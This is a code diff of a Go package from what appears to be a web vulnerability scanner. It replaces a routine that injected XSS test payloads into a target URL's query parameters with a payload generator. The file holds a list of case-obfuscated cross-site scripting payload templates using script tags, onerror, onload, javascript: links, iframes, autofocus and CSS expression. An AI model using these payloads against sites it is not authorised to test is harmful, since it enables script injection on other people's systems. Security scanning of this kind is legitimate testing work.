@@ -1,14 +1,10 @@
 package Xss
 
 import (
-	"bytes"
 	"fmt"
 	"math/rand"
 	"net/url"
 	"time"
-	log "wenscan/Log"
-
-	"github.com/go-resty/resty/v2"
 )
 
 type Xss struct {
@@ -22,6 +18,7 @@ func init() {
 }
 
 var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+var htmlmode = 1
 
 func RandStringRunes(n int) string {
 	b := make([]rune, n)
@@ -32,78 +29,44 @@ func RandStringRunes(n int) string {
 }
 
 var (
-	script_payload  string = "<ScRiPt>%s</sCrIpT>"
+	script_payload string = "<ScRiPt>%s</sCrIpT>"
+	//JaVaScRiPt_payload string = "<ScRiPt>JaVaScRiPt:var %s</sCrIpT>"
 	img_payload     string = "<iMg SrC=1 oNeRrOr=%s>"
 	href_payload    string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
 	svg_payload     string = "<sVg/OnLoAd=%s>"
 	iframe_payload  string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
 	input_payload   string = "<input autofocus onfocus=%s>"
+	style_payload   string = "expression(a(%s))"
 	payload3_prompt string = "prompt(1)"
 )
 
-func (xss *Xss) ParseUrl() error {
-	u, err := url.Parse(xss.RawString)
-	if err != nil {
-		log.Fatal("ParseUrl err:", err.Error())
-	}
-	m, err := url.ParseQuery(u.RawQuery)
-	if err != nil {
-		log.Fatal("ParseUrl err:", err.Error())
-	}
-	xss.Url = u
-	xss.Query = &m
-	return err
+type Generator struct {
+	words []string
+	i     int
+	value string
 }
 
-//Handledata 处理xss数据
-func (xss *Xss) Handledata() {
-
-	var querystring bytes.Buffer
-	var payloads = []string{
-		script_payload,
-		img_payload,
-		href_payload,
-		svg_payload,
-		iframe_payload,
-		input_payload,
+func (g *Generator) Next() bool {
+	if g.i == len(g.words) {
+		return false
 	}
-	log.DebugEnable(true)
-	//生成随机字符串
-	sc := RandStringRunes(12)
-
-	//组装xss payload
-	for _, pl := range payloads {
-		payload := fmt.Sprintf(pl, sc)
-		log.Debug(sc)
-		client := resty.New()
-
-		for k, _ := range *xss.Query {
-			querystring.WriteString(k + payload + "&")
-		}
-		log.Debug("cs:", string(querystring.Bytes()[:querystring.Len()-1]))
-		resp, err := client.R().
-			EnableTrace().
-			SetQueryString(string(querystring.Bytes()[:querystring.Len()-1])).
-			Get(xss.Url.Scheme + xss.Url.User.String() + xss.Url.RawPath)
-		if err != nil {
-			log.Fatal("Get fatal error:", err.Error())
-		}
-		if resp.IsError() {
-			log.Error("  Status Code:", resp.StatusCode())
-			log.Error("  Status     :", resp.Status())
-			log.Error("  Proto      :", resp.Proto())
-			log.Error("  Time       :", resp.Time())
-			log.Error("  Received At:", resp.ReceivedAt())
-			log.Error("  Body       :\n", resp)
-		} else {
-			log.Debug(" request sucess")
-			log.Debug(" responds:\n", resp)
-		}
-
-	}
-
+	g.value = g.words[g.i]
+	g.i++
+	return true
 }
 
-func (xss *Xss) AddXSSVuln(resp *resty.Response) {
+func (g *Generator) Value() interface{} {
+	return g.value
+}
 
+//GeneratorPayload 生成payload
+func (g *Generator) GeneratorPayload(mode int, flag string) string {
+	if htmlmode == mode {
+		g.Next()
+		switch s := g.Value().(type) {
+		case string:
+			return fmt.Sprintf(s, flag)
+		}
+	}
+	return ""
 }
